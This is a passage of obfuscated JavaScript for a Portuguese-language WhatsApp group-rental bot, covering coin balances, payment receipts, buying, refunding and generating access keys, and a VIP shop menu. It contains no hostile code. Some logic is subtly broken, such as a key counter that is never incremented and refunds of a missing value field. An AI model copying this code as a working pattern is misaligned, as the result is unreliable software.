                  fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                  let _0x93194b = "┏◤ [⚙️] *COMPROVANTE DE PAGAMENTO* [⚙️] ◢┓\n            ╟┓\n            ║┢ ❪📖ฺ࣭࣪͘ꕸ▸ *Nome:* " + _0x55a6ac + "\n            ║┢ ❪📱ฺ࣭࣪͘ꕸ▸ *Número:* @" + _0x32e455.split("@")[0] + "\n            ║╽\n            ║┢ ❪💸ฺ࣭࣪͘ꕸ▸ *Valor:* R$ " + Number(_0x2493d6).toFixed(2) + "\n            ║┢ ❪💰ฺ࣭࣪͘ꕸ▸ *Bônus:* R$ " + Number(_0x11e3bf).toFixed(2) + "\n            ║┢ ❪🪙ฺ࣭࣪͘ꕸ▸ *Total:* R$ " + Number(_0x379ac4).toFixed(2) + "\n            ║╽\n            ║┢ 📅⃤ *Data:* " + moment().tz("America/Sao_Paulo").format("DD/MM/YYYY") + "\n            ║┢ ⏰⃤ *Hora:* " + moment().tz("America/Sao_Paulo").format("HH:mm:ss") + "\n            ║╽\n            ║╽ㅤㅤㅤㅤㅤ💠 Robot Banc 💠\n            ╙┷━━━━━━━━━━━━───━━━━━━━━━━━━┛";
                  const _0x1bdc2d = {
                    text: _0x93194b,
                    mentions: [_0x32e455]
                  };
                  _0x263319.sendMessage(_0x3a52d1, _0x1bdc2d);
                  _0x263319.sendMessage(_0x32e455, {
                    text: _0x93194b,
                    mentions: [_0x32e455]
                  });
                  await sleep(2000);
                  if (botoes_) {
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        body: {
                          text: "💠 Parabéns @" + _0x32e455.split("@")[0] + ", seu pagamento foi aprovado no valor de *R$ " + Number(_0x379ac4).toFixed(2) + "* debitado em sua conta virtual da Robot Banc, somado ao bônus de *R$ " + Number(_0x11e3bf).toFixed(2) + "* proveniente da recarga. Para mais informações sobre o uso das moedas, clique no botão abaixo.."
                        },
                        footer: {
                          text: ""
                        },
                        nativeFlowMessage: {
                          buttons: [{
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                              display_text: "INFO ALUGAR",
                              id: _0x1d93be + "infoalugar",
                              quick_reply: "infoalugar"
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    _0x403602("💠 Parabéns @" + _0x32e455.split("@")[0] + ", seu pagamento foi aprovado no valor de *R$ " + Number(_0x379ac4).toFixed(2) + "* debitado em sua conta virtual da Robot Banc, somado ao bônus de *R$ " + Number(_0x11e3bf).toFixed(2) + "* proveniente da recarga. Para mais informações sobre o uso das moedas, use " + _0x1d93be + "infoalugar");
                  }
                }
              } catch (_0xe5c065) {
                console.log(_0xe5c065);
                _0x403602("O sistema parece instável... Por favor, tente novamente mais tarde.");
              }
              break;
            case "moedas":
              if (!JSON.stringify(_0x4c107d).includes("Jeffinho")) {
                _0x4c107d.push({
                  id: "Jeffinho",
                  chaves: []
                });
                fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
              }
              if (!JSON.stringify(_0x4c107d).includes(_0x32e455)) {
                multi = Number(moment.tz("America/Sao_Paulo").format("HHmmss")) + Number(moment.tz("America/Sao_Paulo").format("DDMMYY"));
                multi *= Number(_0x32e455.slice(4, 10));
                _0x4c107d.push({
                  id: _0x32e455,
                  saldo: 0,
                  UID: multi,
                  rg: moment.tz("America/Sao_Paulo").format("DD-MM-20YY"),
                  cortesia: 2,
                  mm: moment.tz("America/Sao_Paulo").format("MM")
                });
                fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
              }
              try {
                ppimg = await _0x263319.profilePictureUrl(_0x32e455.split("@")[0] + "@c.us", "image");
              } catch {
                ppimg = "https://media.discordapp.net/attachments/1120494072138838068/1120494741495230535/IMG-20230521-WA0548.jpg";
              }
              _0x3529b0 = _0x4c107d.map(_0x55cb45 => _0x55cb45.id).indexOf(_0x32e455);
              _0xc3d45a = _0x4c107d[_0x3529b0];
              txt = "📖 *NOME:* " + _0x55a6ac + "\n💸 *SALDO:* R$ " + Number(_0xc3d45a.saldo).toFixed(2) + "\n📱 *WHATSAPP:* wa.me/" + _0xc3d45a.id.split("@")[0] + "\n🆔 *ID:* " + _0xc3d45a.UID + "\n\n_Registrado em " + _0xc3d45a.rg + "_";
              const _0x493abd = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: txt,
                contextInfo: {
                  externalAdReply: {
                    title: NomeDoBot,
                    body: "",
                    thumbnail: await getBuffer(ppimg),
                    mediaType: 1,
                    showAdAttribution: true,
                    sourceUrl: SITE_JEFF_APIS + "/"
                  }
                }
              }, _0x493abd);
              break;
            case "minhaskey":
              txta = "*_SUAS KEYs_*";
              nmru = 0;
              BCW = _0x4c107d.map(_0x66affc => _0x66affc.id).indexOf("Jeffinho");
              for (_0xc3d45a of _0x4c107d[BCW].chaves) {
                if (_0xc3d45a.cliente == _0x32e455) {
                  txta += "\n• " + _0xc3d45a.key;
                  _0x3e1adf += 1;
                }
              }
              if (nmru <= 0) {
                return _0x403602("Você não possui keys");
              }
              _0x403602(_0xd20756 ? "Te enviei PV" : "Enviando");
              _0x56cb1a(_0x32e455, txta);
              break;
            case "keys":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              let _0x3e69bf = "*_KEYs_*";
              let _0x2405df = _0x4c107d.findIndex(_0x1b4176 => _0x1b4176.id === "Jeffinho");
              let _0x81e487 = [];
              if (_0x2405df !== -1 && _0x4c107d[_0x2405df].chaves.length > 0) {
                for (let _0x4f1f54 of _0x4c107d[_0x2405df].chaves) {
                  let _0x20974e = _0x4f1f54.dias;
                  _0x3e69bf += "\n\n" + "- ".repeat(20) + "\n• Key: " + _0x4f1f54.key + "\n• Cliente: @" + _0x4f1f54.cliente.split("@")[0] + "\n• Validade: " + (_0x20974e > 0 ? _0x20974e + " dia" + (_0x20974e > 1 ? "s" : "") : "∞ INFINITO");
                  _0x81e487.push(_0x4f1f54.cliente);
                }
                _0x403602(_0xd20756 ? "Te enviei PV" : "Enviando");
                const _0x47225e = {
                  text: _0x3e69bf,
                  mentions: _0x81e487
                };
                _0x263319.sendMessage(_0x32e455, _0x47225e);
              } else {
                _0x403602("Você não possui keys");
              }
              break;
            case "addmoeda":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              var [_0x3e1adf, _0x531709] = _0x1d6557.split("/");
              if (!_0x3e1adf || !_0x531709) {
                return _0x403602("Você vai colocar o número da pessoa e após isso uma barra ( / ). Após a barra, coloque o saldo que será adc. Ex:\n" + (_0x1d93be + _0x3dec88) + " " + _0x3a52d1.split("@")[0] + "/30");
              }
              if (!Number(_0x531709)) {
                return _0x403602(_0x531709 + " não é número...");
              }
              jeffinho = _0x3e1adf.toLowerCase() == "me" ? _0x32e455 : _0x3e1adf.includes("@") ? _0x3e1adf.split("@")[1].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : _0x3e1adf.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
              if (!JSON.stringify(_0x4c107d).includes(jeffinho)) {
                multi = Number(moment.tz("America/Sao_Paulo").format("HHmmss")) + Number(moment.tz("America/Sao_Paulo").format("DDMMYY"));
                multi *= Number(_0x32e455.slice(4, 10));
                _0x4c107d.push({
                  id: jeffinho,
                  saldo: 0,
                  UID: multi,
                  rg: moment.tz("America/Sao_Paulo").format("DD-MM-20YY"),
                  cortesia: 2,
                  mm: moment.tz("America/Sao_Paulo").format("MM"),
                  chaves: []
                });
                fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
              }
              _0x3529b0 = _0x4c107d.map(_0x91a1c0 => _0x91a1c0.id).indexOf(jeffinho);
              _0x4c107d[_0x3529b0].saldo += Number(_0x531709);
              fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
              _0x5b6fe5("💠 R$ " + Number(_0x531709).toFixed(2) + " adc ao saldo do usuário @" + jeffinho.split("@")[0]);
              break;
            case "buygp":
              if (!JSON.stringify(_0x4c107d).includes(_0x32e455) || !JSON.stringify(_0x4c107d).includes("Jeffinho")) {
                return _0x403602("Você não possui saldo... Veja " + _0x1d93be + "me");
              }
              if (!_0x1d6557) {
                return _0x403602("Insira um link de convite ao lado do comando.");
              }
              barra = _0x1d6557.replace(" |", "|").replace("| ", "|").replace(" | ", "|");
              var [_0x254f2c, _0x16f299] = barra.split("|");
              if (!_0x254f2c.includes("chat.whatsapp.com/")) {
                return _0x403602("Ops, verifique o link que você inseriu.");
              }
              if (!_0x16f299 || !Number(_0x16f299) || Number(_0x16f299) < 1 || Number(_0x16f299) > 5) {
                return _0x403602("Coloque após o link uma barra ( | ) e o número referente a quantidade de dias de aluguel (veja " + _0x1d93be + "loja), assim:\n" + (_0x1d93be + _0x3dec88) + " link|1");
              }
              if (_0x16f299.includes(".")) {
                return _0x403602("Não pode números decimais...");
              }
              linkkk = _0x254f2c.split("app.com/")[1];
              try {
                _0x3529b0 = _0x4c107d.map(_0x4e9e12 => _0x4e9e12.id).indexOf(_0x32e455);
                BC = _0x4c107d.map(_0x49994f => _0x49994f.id).indexOf("Jeffinho");
                if (Number(_0x16f299) === 1) {
                  _0x3e1adf = 5;
                }
                if (Number(_0x16f299) === 2) {
                  _0x3e1adf = 10;
                }
                if (Number(_0x16f299) === 3) {
                  _0x3e1adf = 18;
                }
                if (Number(_0x16f299) === 4) {
                  _0x3e1adf = 27;
                }
                if (Number(_0x16f299) === 5) {
                  _0x3e1adf = 35;
                }
                if (Number(_0x4c107d[_0x3529b0].saldo) < _0x3e1adf) {
                  return _0x403602("[❗] Você não possui saldo suficiente para efetuar essa compra... Para alugar " + (Number(_0x16f299) === 1 ? "15" : "" + Number(Number(_0x16f299) - 1) * 30) + " dias, são necessários R$ " + _0x3e1adf.toFixed(2) + ", e você possui apenas R$ " + Number(_0x4c107d[_0x3529b0].saldo).toFixed(2) + " em sua conta 😕");
                }
                _0x4c107d[_0x3529b0].saldo -= _0x3e1adf;
                fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                idks = "V" + _0x16f299 + "-";
                idks += "" + Number(_0x4f1071.replace("-", "").slice(2, 8)) * Number(_0x32e455.slice(2, 8));
                idks += "R" + _0x3e1adf + "T-" + (Number(moment.tz("America/Sao_Paulo").format("DDMMYY")) + Number(moment.tz("America/Sao_Paulo").format("HHmmss"))) + "M";
                _0x4c107d[BC].chaves.push({
                  key: idks,
                  tipo: 1,
                  dias: Number(_0x16f299) === 1 ? 15 : Number(Number(_0x16f299) - 1) * 30,
                  cliente: _0x32e455
                });
                fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                await _0x263319.groupAcceptInvite("" + linkkk);
                if (botoes_) {
                  setTimeout(async () => {
                    const _0x56f2f3 = {
                      text: "💡 abaixo a chave de acesso... clique no botão 𝗖𝗢𝗣𝗜𝗔𝗥 e cole a mesma no seu grupo para validar os dados e liberar os comandos ✋🏽😳🤚🏽\n\n" + idks
                    };
                    await _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        body: _0x56f2f3,
                        footer: {
                          text: ""
                        },
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR",
                              id: "sim",
                              copy_code: "" + idks
                            })
                          }]
                        }
                      }
                    });
                  }, 1000);
                } else {
                  const _0x285f9d = {
                    text: "💡 abaixo a chave de acesso... copie e envie a chave no seu grupo para validar os dados e liberar os comandos ✋🏽😳🤚🏽",
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x285f9d).then(() => {
                    _0x403602("" + idks);
                  }).catch(_0x48f317 => {
                    console.error("Erro ao enviar a mensagem:", _0x48f317);
                  });
                }
              } catch (_0x1fd170) {
                if (String(_0x1fd170).includes("resource-limit")) {
                  return _0x403602("O grupo já está com o número máximo de membros... Não consigo entrar 🫠");
                } else if (String(_0x1fd170).includes("not-authorized")) {
                  return _0x403602("Não foi possível entrar no grupo porque algum admin me baniu... Por favor, peça para o meu dono me adicionar (chame " + _0x1d93be + "dono)");
                } else {
                  return _0x403602("Não foi possível entrar no grupo... Por favor, chame meu dono para ele registrar os dados 🎲");
                }
              }
              break;
            case "transferirgp":
              if (_0x1e3043.length <= 0) {
                return _0x403602("Não há grupos registrados");
              }
              if (!JSON.stringify(_0x1e3043).includes(_0x32e455)) {
                return _0x403602("Não há grupos registrados em seu nome 😀");
              }
              barra = _0x1d6557.replace(" |", "|").replace("| ", "|").replace(" | ", "|");
              var [_0x254f2c, _0x16f299] = barra.split("|");
              if (!_0x254f2c.includes("chat.whatsapp.com/")) {
                return _0x403602("Ops, verifique o link que você inseriu.");
              }
              caixa = [];
              for (_0x1c0998 of _0x1e3043) {
                if (_0x1c0998.cliente == _0x32e455) {
                  const _0xd9fc45 = {
                    id: _0x1c0998.id,
                    nome: _0x1c0998.nome
                  };
                  caixa.push(_0xd9fc45);
                }
              }
              if (!Number(_0x16f299) || Number(_0x16f299) < 1 || Number(_0x16f299) > caixa.length) {
                resp = "_Escolha após a barra ( | ) o número correspondente ao grupo que você quer *APAGAR* para transferir para um novo, ex: " + (_0x1d93be + _0x3dec88) + " link|1_\n_Grupos registrados em seu nome:_";
                for (_0xc3d45a = 0; _0xc3d45a < caixa.length; _0xc3d45a++) {
                  resp += "\n\n»" + (_0xc3d45a + 1) + "«\n• *Grupo:* " + caixa[_0xc3d45a].nome;
                }
                return _0x403602(resp);
              }
              try {
                idgp = caixa[Number(_0x16f299) - 1].id;
                _0x3529b0 = _0x1e3043.map(_0x51cece => _0x51cece.id).indexOf(idgp);
                timerent = _0x1e3043[_0x3529b0].tempo;
                _0x1e3043.splice(_0x3529b0, 1);
                fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                AC = _0x565fa1.map(_0x2c7893 => _0x2c7893.id).indexOf(idgp);
                _0x565fa1.splice(AC, 1);
                fs.writeFileSync("./DADOS/aluguel/grupos.json", JSON.stringify(_0x565fa1, null, 2));
                try {
                  await sleep(2000);
                  _0x263319.groupLeave(idgp);
                } catch {
                  _0x1b86ad(_0x4f1071, "😪");
                }
                BC = _0x4c107d.map(_0x3a2491 => _0x3a2491.id).indexOf("Jeffinho");
                _0x2722a9 = _0x254f2c.split("app.com/")[1];
                idks = "V" + _0x16f299 + "-";
                idks += "" + Number(_0x4f1071.replace("-", "").slice(2, 8)) * Number(_0x32e455.slice(2, 8));
                idks += "R" + _0x3e1adf + "T-" + (Number(moment.tz("America/Sao_Paulo").format("DDMMYY")) + Number(moment.tz("America/Sao_Paulo").format("HHmmss"))) + "M";
                const _0x26dd90 = {
                  key: idks,
                  tipo: 1,
                  dias: timerent,
                  cliente: _0x32e455
                };
                _0x4c107d[BC].chaves.push(_0x26dd90);
                fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                await sleep(2000);
                _0x263319.groupAcceptInvite("" + _0x2722a9);
                _0x403602("Dados deletados do antigo grupo com sucesso... Estarei te enviando " + (_0xd20756 ? "no PV" : "abaixo") + " a Key de acesso. Jogue a mesma no novo grupo para liberar o acesso ✅");
                await sleep(1000);
                _0x56cb1a(_0x32e455, idks);
              } catch (_0xbac0d0) {
                if (String(_0xbac0d0).includes("resource-limit")) {
                  _0x403602("O grupo já está com o número máximo de membros... Não consigo entrar 🫠");
                } else if (String(_0xbac0d0).includes("not-authorized")) {
                  _0x403602("Não foi possível entrar no grupo pq algum admin me baniu... Pfvr, peça para o meu dono me adicionar (chame " + _0x1d93be + "dono)");
                } else {
                  return _0x403602("Não foi possível entrar no grupo... Pfvr, chame meu dono para ele registrar os dados 🎲");
                }
              }
              break;
            case "buykeygp":
              if (!JSON.stringify(_0x4c107d).includes(_0x32e455) || !JSON.stringify(_0x4c107d).includes("Jeffinho")) {
                return _0x403602("Vc não possui saldo... Veja " + _0x1d93be + "me");
              }
              if (!_0x1d6557 || !Number(_0x1d6557) || Number(_0x1d6557) < 1 || Number(_0x1d6557) > 5) {
                return _0x403602("Coloque após o comando o número referente a quantidade de dias de aluguel (veja " + _0x1d93be + "loja), assim:\n" + (_0x1d93be + _0x3dec88) + " 1");
              }
              _0x3529b0 = _0x4c107d.map(_0x5c0a20 => _0x5c0a20.id).indexOf(_0x32e455);
              BC = _0x4c107d.map(_0x26b5d7 => _0x26b5d7.id).indexOf("Jeffinho");
              if (Number(_0x1d6557) === 1) {
                _0x3e1adf = 5;
              }
              if (Number(_0x1d6557) === 2) {
                _0x3e1adf = 10;
              }
              if (Number(_0x1d6557) === 3) {
                _0x3e1adf = 18;
              }
              if (Number(_0x1d6557) === 4) {
                _0x3e1adf = 27;
              }
              if (Number(_0x1d6557) === 5) {
                _0x3e1adf = 35;
              }
              if (Number(_0x4c107d[_0x3529b0].saldo) < _0x3e1adf) {
                return _0x403602("[❗] Você não possui saldo suficiente para efetuar essa compra... Para alugar " + (Number(_0x1d6557) === 1 ? "15" : "" + Number(Number(_0x1d6557) - 1) * 30) + " dias, são necessários R$ " + _0x3e1adf.toFixed(2) + ", e você possui apenas R$ " + Number(_0x4c107d[_0x3529b0].saldo).toFixed(2) + " em sua conta 😕");
              }
              _0x4c107d[_0x3529b0].saldo -= _0x3e1adf;
              fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
              idks = "K" + _0x1d6557 + "-";
              idks += "" + Number(_0x4f1071.replace("-", "").slice(2, 8)) * Number(_0x32e455.slice(2, 8));
              idks += "B" + _0x3e1adf + "Y-" + (Number(moment.tz("America/Sao_Paulo").format("DDMMYY")) + Number(moment.tz("America/Sao_Paulo").format("HHmmss"))) + "E";
              _0x4c107d[BC].chaves.push({
                key: idks,
                tipo: 1,
                dias: Number(_0x1d6557) === 1 ? 15 : Number(Number(_0x1d6557) - 1) * 30,
                cliente: _0x32e455,
                valor: _0x3e1adf
              });
              fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
              _0x263319.updateBlockStatus(_0x32e455, "unblock");
              _0x403602("💡 Te enviarei " + (_0xd20756 ? "no PV" : "abaixo") + " a chave de acesso... Copie e cole a mesma no seu grupo para validar os dados e liberar os comandos ✋🏽😳🤚🏽");
              _0x56cb1a(_0x32e455, idks);
              break;
            case "gerarkeygp":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              barra = _0x1d6557.replace(" /", "/").replace("/ ", "/").replace(" / ", "/");
              var [_0x254f2c, _0x16f299] = barra.split("/");
              if (!_0x1d6557.includes("/")) {
                return _0x403602("Você vai colocar o número da pessoa que alugou e após isso uma barra ( / ). Após a barra, coloque a quantidade de dias que este alugou para seu grupo. Ex:\n" + (_0x1d93be + _0x3dec88) + " " + _0x3a52d1.split("@")[0] + "/30");
              }
              if (!JSON.stringify(_0x4c107d).includes(_0x32e455) || !JSON.stringify(_0x4c107d).includes("Jeffinho")) {
                return _0x403602("Vc não possui saldo... Veja " + _0x1d93be + "me");
              }
              jeffinho = _0x254f2c.toLowerCase() == "me" ? _0x32e455 : _0x254f2c.includes("@") ? _0x254f2c.split("@")[1].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : _0x254f2c.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
              const [_0x5105f2] = await _0x263319.onWhatsApp(jeffinho.split("@")[0]);
              if (_0x5105f2 == undefined) {
                return _0x403602("O número " + jeffinho.split("@")[0] + " não é válido no whatsapp");
              }
              BC = _0x4c107d.map(_0xc76a83 => _0xc76a83.id).indexOf("Jeffinho");
              _0x3e1adf = Number(_0x16f299) > 0 ? Number(_0x16f299) : 0;
              idks = "G" + _0x16f299 + "-";
              idks += "" + Number(_0x4f1071.replace("-", "").slice(2, 8)) * Number(jeffinho.slice(2, 8));
              idks += "M" + _0x3e1adf + "H-" + (Number(moment.tz("America/Sao_Paulo").format("DDMMYY")) + Number(moment.tz("America/Sao_Paulo").format("HHmmss"))) + "B";
              const _0x4fd503 = {
                key: idks,
                tipo: 1,
                dias: _0x3e1adf,
                cliente: jeffinho,
                valor: 0
              };
              _0x4c107d[BC].chaves.push(_0x4fd503);
              fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
              const _0x185ad0 = "\n    _Key gerada com sucesso_ ✅\n\n-> " + idks + " <-\n\n*Descrição:*\n• Quantidade: " + (_0x3e1adf > 0 ? _0x3e1adf + " dia" + (_0x3e1adf > 1 ? "s" : "") : "∞ INFINITO") + "\n• Cliente: @" + jeffinho.split("@")[0] + "\n    ";
              if (botoes_) {
                const _0x298a6c = {
                  text: "" + _0x185ad0
                };
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    body: _0x298a6c,
                    footer: {
                      text: ""
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                          display_text: "COPIAR",
                          id: "sim",
                          copy_code: "" + idks
                        })
                      }]
                    }
                  }
                }, {});
              } else {
                const _0x48d779 = {
                  text: "" + _0x185ad0,
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x48d779).then(() => {
                  _0x403602("" + idks);
                });
              }
              break;
            case "reembolsar":
              if (!JSON.stringify(_0x4c107d).includes(_0x32e455) || !JSON.stringify(_0x4c107d).includes("Jeffinho")) {
                return _0x403602("Vc não comprou nenhuma key... Veja " + _0x1d93be + "minhaskey");
              }
              if (!_0x1d6557) {
                return _0x403602("KD a key que vc deseja reembolsar?");
              }
              _0x3529b0 = _0x4c107d.map(_0x471bec => _0x471bec.id).indexOf(_0x32e455);
              BC = _0x4c107d.map(_0x43e33c => _0x43e33c.id).indexOf("Jeffinho");
              if (!JSON.stringify(_0x4c107d[BC].chaves).includes(_0x1d6557)) {
                return _0x403602("Chave não encontrada ou inexistente...");
              }
              AD = _0x4c107d[BC].chaves.map(_0x2043d3 => _0x2043d3.key).indexOf(_0x1d6557);
              if (_0x4c107d[BC].chaves[AD].cliente != _0x32e455) {
                return _0x403602("Chave não encontrada ou inexistente...");
              }
              _0x3e1adf = _0x4c107d[BC].chaves[AD].valor;
              _0x4c107d[_0x3529b0].saldo += _0x3e1adf;
              fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
              _0x4c107d[BC].chaves.splice(AD, 1);
              fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
              _0x403602("💠 Saldo reembolsado em sua conta da Robot Banc no valor de R$ " + Number(_0x3e1adf).toFixed(2) + " (Key deletada) 🤭");
              break;
            case "desbloq":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1dcf0a) {
                return _0x403602("marque cm @ ou a msg...");
              }
              _0x263319.updateBlockStatus(_0x1dcf0a, "unblock");
              return _0x403602("Sucesso!");
              break;
            case "lojavip":
            case "lojapremium":
            case "comprarvip":
              const _0x15f435 = "\n👑 *Vantagens* 👑\n~ Menu puxadas\n~ Comandos Exclusivos para Vips\n~ acesso ao pv do bot\n~ e muito mais!!!";
              if (botoes_) {
                const _0x56df49 = {
                  text: "" + _0x15f435
                };
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    body: {
                      text: "💎 ```Premium/Vip``` 💎"
                    },
                    footer: _0x56df49,
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "░ ABRIR ░",
                          sections: [{
                            title: "Escolha um Produto Abaixo.",
                            rows: [{
                              id: _0x1d93be + "vip-1d",
                              title: tituloproduto1(_0x1d93be, _0x32e455),
                              description: SubtituloProduto1(_0x1d93be, _0x32e455)
                            }, {
                              id: _0x1d93be + "vip-5d",
                              title: tituloproduto2(_0x1d93be, _0x32e455),
                              description: SubtituloProduto2(_0x1d93be, _0x32e455)
                            }, {
                              id: _0x1d93be + "vip-1s",
                              title: tituloproduto3(_0x1d93be, _0x32e455),
                              description: SubtituloProduto3(_0x1d93be, _0x32e455)
                            }, {
                              id: _0x1d93be + "vip-2s",
                              title: tituloproduto4(_0x1d93be, _0x32e455),
                              description: SubtituloProduto4(_0x1d93be, _0x32e455)
                            }, {
                              id: _0x1d93be + "vip-1m",
                              title: tituloproduto5(_0x1d93be, _0x32e455),
                              description: SubtituloProduto5(_0x1d93be, _0x32e455)
                            }, {
                              id: _0x1d93be + "vip-2m",
                              title: tituloproduto6(_0x1d93be, _0x32e455),
                              description: SubtituloProduto6(_0x1d93be, _0x32e455)
                            }, {
                              id: _0x1d93be + "vip-3m",
                              title: tituloproduto7(_0x1d93be, _0x32e455),
                              description: SubtituloProduto7(_0x1d93be, _0x32e455)
                            }, {
                              id: _0x1d93be + "vip-perma",
                              title: tituloproduto8(_0x1d93be, _0x32e455),
                              description: SubtituloProduto8(_0x1d93be, _0x32e455)
                            }]
                          }]
                        })
                      }]
                    }
                  }
                }, {});
              } else {
                _0x403602("\n" + _0x15f435 + "\n\nPRODUTOS\n\n╭═══════════════════ ┐\n\nTitulo: " + tituloproduto1(_0x1d93be, _0x32e455) + "\nDescrição: " + SubtituloProduto1(_0x1d93be, _0x32e455) + "\n\nUse: " + _0x1d93be + "vip-1d\n\n\nTitulo: " + tituloproduto2(_0x1d93be, _0x32e455) + "\nDescrição: " + SubtituloProduto2(_0x1d93be, _0x32e455) + "\n\nUse: " + _0x1d93be + "vip-5d\n\n\nTitulo: " + tituloproduto3(_0x1d93be, _0x32e455) + "\nDescrição: " + SubtituloProduto3(_0x1d93be, _0x32e455) + "\n\nUse: " + _0x1d93be + _0x1d93be + "vip-1s\n\n\nTitulo: " + tituloproduto4(_0x1d93be, _0x32e455) + "\nDescrição: " + SubtituloProduto4(_0x1d93be, _0x32e455) + "\n\nUse: " + _0x1d93be + "vip-2s\n\n\nTitulo: " + tituloproduto5(_0x1d93be, _0x32e455) + "\nDescrição: " + SubtituloProduto5(_0x1d93be, _0x32e455) + "\n\nUse: " + _0x1d93be + "vip-1m\n\n\nTitulo: " + tituloproduto6(_0x1d93be, _0x32e455) + "\nDescrição: " + SubtituloProduto6(_0x1d93be, _0x32e455) + "\n\nUse: " + _0x1d93be + "vip-2m\n\n\nTitulo: " + tituloproduto7(_0x1d93be, _0x32e455) + "\nDescrição: " + SubtituloProduto7(_0x1d93be, _0x32e455) + "\n\nUse: " + _0x1d93be + "vip-3m\n\n\nTitulo: " + tituloproduto8(_0x1d93be, _0x32e455) + "\nDescrição: " + SubtituloProduto8(_0x1d93be, _0x32e455) + "\n\nUse: " + _0x1d93be + "vip-perma\n\n╰╦══════════════════ ✞\n");
              }
              break;
            case "modoaluguel2":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x2a5ff3) {
                return _0x403602(enviar.msg.donomt);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 para ativar, 0 para desativar este recurso.");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x2f5db2) {
                  return _0x403602("O modo aluguel2 já está ativado neste grupo mestre!");
                }
                _0x3bd584[0].aluguel = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Ativou com sucesso o recurso de modo aluguel2 neste grupo, agora ninguém pode usar meus comandos aqui somente você mestre.");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x2f5db2) {
                  return _0x403602("O modo aluguel2 não está ativado neste grupo mestre!");
                }
                _0x3bd584[0].aluguel = false;
                _0x33e29e(_0x3bd584);
                _0x403602("O modo aluguel2 foi desativado, agora o grupo pode usar meus comandos sem nenhuma restrição.");
              } else {
                _0x403602("1 para ativar, 0 para desativar este recurso.");
              }
              break;
            case "me":
              {
                if (!_0xd20756) {
                  return _0x403602("Somente em grupos!");
                }
                if (!JSON.stringify(_0x4c107d).includes("Jeffinho")) {
                  _0x4c107d.push({
                    id: "Jeffinho",
                    chaves: []
                  });
                  fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                }
                if (!JSON.stringify(_0x4c107d).includes(_0x32e455)) {
                  multi = Number(moment.tz("America/Sao_Paulo").format("HHmmss")) + Number(moment.tz("America/Sao_Paulo").format("DDMMYY"));
                  multi *= Number(_0x32e455.slice(4, 10));
                  _0x4c107d.push({
                    id: _0x32e455,
                    saldo: 0,
                    UID: multi,
                    rg: moment.tz("America/Sao_Paulo").format("DD-MM-20YY"),
                    cortesia: 2,
                    mm: moment.tz("America/Sao_Paulo").format("MM")
                  });
                  fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                }
                let _0x2f79c6 = "" + _0x32e455.split("@")[0];
                if (!_0x1dcf0a) {
                  try {
                    ppimg = await _0x263319.profilePictureUrl(_0x32e455.split("@")[0] + "@c.us", "image");
                  } catch {
                    ppimg = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                  }
                  try {
                    var _0x421fc0 = palavrasc[Math.floor(Math.random() * palavrasc.length)];
                    try {
                      var _0x2ab142 = await _0x263319.fetchStatus(_0x32e455);
                    } catch {
                      var _0x2ab142 = "Privado ou inexistente. ";
                    }
                    var _0x440dde = _0x2ab142.status;
                    var _0xe4f56c = _0x31fb03.filter(_0x3d5bdd => _0x3d5bdd == _0x32e455).length;
                    var _0x1d9c7b = _0x5e0fc1(_0x32e455);
